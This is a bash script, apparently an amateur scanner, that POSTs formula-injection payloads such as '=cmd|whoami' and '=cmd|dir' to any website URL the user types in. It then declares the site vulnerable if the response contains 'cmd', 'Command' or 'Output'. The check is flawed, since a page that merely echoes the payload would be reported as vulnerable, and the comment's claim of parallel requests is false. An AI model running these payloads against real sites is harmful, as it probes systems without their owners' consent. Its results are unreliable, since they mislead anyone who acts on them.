#!/bin/bash

# Function to print colored output
print_color() {
    local color=$1
    shift
    echo -e "\e[${color}m$@\e[0m"
}

# Function to test for CSV Injection vulnerability
test_csv_injection() {
    target=$1
    echo "Testing CSV Injection vulnerability on $target..."

    # Payloads to test for CSV Injection vulnerability
    payloads=('";=cmd|"' '"=cmd|"' '";=cmd|' '"=cmd|' '"=cmd,"' '";=cmd|whoami"' '";=cmd|dir"')

    # Loop through payloads and send requests in parallel
    for payload in "${payloads[@]}"; do
        response=$(curl -s -X POST -d "$payload" "$target")
        # Check for common indicators of successful injection
        if [[ $response == *"cmd"* ]] || [[ $response == *"Command"* ]] || [[ $response == *"Output"* ]]; then
            print_color 32 "Vulnerable! CSV Injection vulnerability found on $target with payload: $payload"
            echo "To test the vulnerability, inject the payload into a CSV file."
            return
        fi
    done

    print_color 31 "Not Vulnerable! CSV Injection vulnerability not found on $target"
}

# Main function
main() {
    # Prompt for target website URL
    read -p "Enter your target website URL: " target_website

    # Test for CSV Injection vulnerability
    test_csv_injection "$target_website"
}

# Run the main function
main
